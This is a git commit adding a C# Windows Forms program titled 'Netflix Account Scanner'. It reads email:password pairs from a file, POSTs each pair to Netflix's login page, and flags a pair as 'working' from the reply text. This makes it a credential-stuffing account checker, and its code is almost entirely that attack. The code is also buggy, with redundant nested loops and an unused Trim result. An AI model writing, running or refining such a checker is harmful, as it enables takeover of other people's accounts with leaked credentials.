30c298940faca5507acecc521a2f0208f97aad5c
Jack Ryder <ProNinjaCat@gmail.com>
2015-04-05 00:23:57 +0100

    Initial Commit
    Commited what i've done so far, although there are a few bugs i need to
    fix.

---
+++ NetflixChecker/Form1.Designer.cs
@@ -0,0 +1,113 @@
+﻿namespace NetflixChecker
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.textBox1 = new System.Windows.Forms.TextBox();
+            this.adder = new System.Windows.Forms.Button();
+            this.scanner = new System.Windows.Forms.Button();
+            this.webBrowser1 = new System.Windows.Forms.WebBrowser();
+            this.textBox2 = new System.Windows.Forms.TextBox();
+            this.SuspendLayout();
+            // 
+            // textBox1
+            // 
+            this.textBox1.BackColor = System.Drawing.Color.White;
+            this.textBox1.Location = new System.Drawing.Point(12, 12);
+            this.textBox1.Multiline = true;
+            this.textBox1.Name = "textBox1";
+            this.textBox1.ReadOnly = true;
+            this.textBox1.Size = new System.Drawing.Size(339, 118);
+            this.textBox1.TabIndex = 0;
+            // 
+            // adder
+            // 
+            this.adder.Location = new System.Drawing.Point(357, 12);
+            this.adder.Name = "adder";
+            this.adder.Size = new System.Drawing.Size(103, 46);
+            this.adder.TabIndex = 1;
+            this.adder.Text = "Add accounts";
+            this.adder.UseVisualStyleBackColor = true;
+            this.adder.Click += new System.EventHandler(this.adder_Click);
+            // 
+            // scanner
+            // 
+            this.scanner.Location = new System.Drawing.Point(357, 84);
+            this.scanner.Name = "scanner";
+            this.scanner.Size = new System.Drawing.Size(103, 46);
+            this.scanner.TabIndex = 2;
+            this.scanner.Text = "Start scanner";
+            this.scanner.UseVisualStyleBackColor = true;
+            this.scanner.Click += new System.EventHandler(this.scanner_Click);
+            // 
+            // webBrowser1
+            // 
+            this.webBrowser1.Location = new System.Drawing.Point(223, 136);
+            this.webBrowser1.MinimumSize = new System.Drawing.Size(20, 20);
+            this.webBrowser1.Name = "webBrowser1";
+            this.webBrowser1.Size = new System.Drawing.Size(237, 122);
+            this.webBrowser1.TabIndex = 3;
+            // 
+            // textBox2
+            // 
+            this.textBox2.BackColor = System.Drawing.Color.White;
+            this.textBox2.Location = new System.Drawing.Point(12, 136);
+            this.textBox2.Multiline = true;
+            this.textBox2.Name = "textBox2";
+            this.textBox2.ReadOnly = true;
+            this.textBox2.Size = new System.Drawing.Size(192, 120);
+            this.textBox2.TabIndex = 4;
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(472, 268);
+            this.Controls.Add(this.textBox2);
+            this.Controls.Add(this.webBrowser1);
+            this.Controls.Add(this.scanner);
+            this.Controls.Add(this.adder);
+            this.Controls.Add(this.textBox1);
+            this.Name = "Form1";
+            this.Text = "Netflix Account Scanner";
+            this.Load += new System.EventHandler(this.Form1_Load);
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.TextBox textBox1;
+        private System.Windows.Forms.Button adder;
+        private System.Windows.Forms.Button scanner;
+        private System.Windows.Forms.WebBrowser webBrowser1;
+        private System.Windows.Forms.TextBox textBox2;
+    }
+}
+
---
+++ NetflixChecker/Form1.cs
@@ -0,0 +1,133 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using System.IO;
+using System.Net;
+
+
+namespace NetflixChecker
+{
+    public partial class Form1 : Form
+    {
+        public Form1()
+        {
+            InitializeComponent();
+        }
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+
+        }
+
+        private void scanner_Click(object sender, EventArgs e)
+        {
+            int accounts = textBox1.Lines.Length;
+            string url = "https://www.netflix.com/Login";
+            for (int i = 0; i != accounts; i++)
+            {
+                foreach (string st in textBox1.Lines)
+                {
+                    if (string.IsNullOrEmpty(st))
+                    {
+                        continue;
+                    }
+                    int location = st.IndexOf(':');
+                    string username = st.Substring(0,location);
+                    string password = st.Substring(location,st.Length-(location));
+                    password = password.Replace(':',' ');
+                    password.Trim();
+                    login(username,password);
+                }
+                
+            }
+        }
+
+        private void adder_Click(object sender, EventArgs e)
+        {
+            string path = string.Empty;
+            string[] accounts;
+            OpenFileDialog ofd = new OpenFileDialog();
+            ofd.ShowDialog();
+            path = ofd.FileName;
+            accounts = File.ReadAllLines(path);
+            textBox1.Text = string.Empty;
+            foreach (string account in accounts)
+            {
+                textBox1.Text += "\n" + account;
+            }
+            adder.Enabled = false;
+        }
+        private void login(string username, string password)
+        {
+            try
+            {
+                CookieCollection cookies = new CookieCollection();
+                HttpWebRequest request =
+                    (HttpWebRequest)WebRequest.Create("https://www.netflix.com/login");
+                request.CookieContainer = new CookieContainer();
+                request.CookieContainer.Add(cookies);
+                //Get the response from the server and save the cookies from the first request..
+                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
+                cookies = response.Cookies;
+
+
+                string formparams = string.Format("email={0}&password={1}",
+                                                   username, password);
+
+                //Create a request using a URL that can recieve a post
+                HttpWebRequest webreq =
+                    (HttpWebRequest)WebRequest.Create("https://www.netflix.com/login");
+                webreq.CookieContainer = new CookieContainer();
+                webreq.CookieContainer.Add(cookies);
+                //Set a method property of the request to POST
+                webreq.Method = "POST";
+                webreq.Referer = "https://www.netflix.com/login";
+                webreq.ContentType = "application/x-www-form-urlencoded";
+                webreq.UserAgent = "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.121 Safari/535.2";
+
+
+                //Create a POST data and convert it to a byte array
+                byte[] bytes = Encoding.ASCII.GetBytes(formparams);
+
+                webreq.ContentLength = bytes.Length;
+
+                //write
+                Stream postdata = webreq.GetRequestStream(); //open connection
+                postdata.Write(bytes, 0, bytes.Length); //send the data
+                postdata.Close();
+
+
+                WebResponse resp = webreq.GetResponse();
+                Stream answer = resp.GetResponseStream();
+
+
+                StreamReader _answer = new
+                      StreamReader(webreq.GetResponse().GetResponseStream());
+
+                string reply = _answer.ReadToEnd();
+
+                textBox2.Text = reply;
+
+                if (reply.Contains("Restart Your Membership"))
+                {
+                    MessageBox.Show("working");
+                }
+                else
+                {
+                    MessageBox.Show("not Working");
+                }
+                textBox2.Clear();
+            }
+            catch (Exception e)
+            {
+                MessageBox.Show(e.Message);
+            }
+        }
+    }
+}
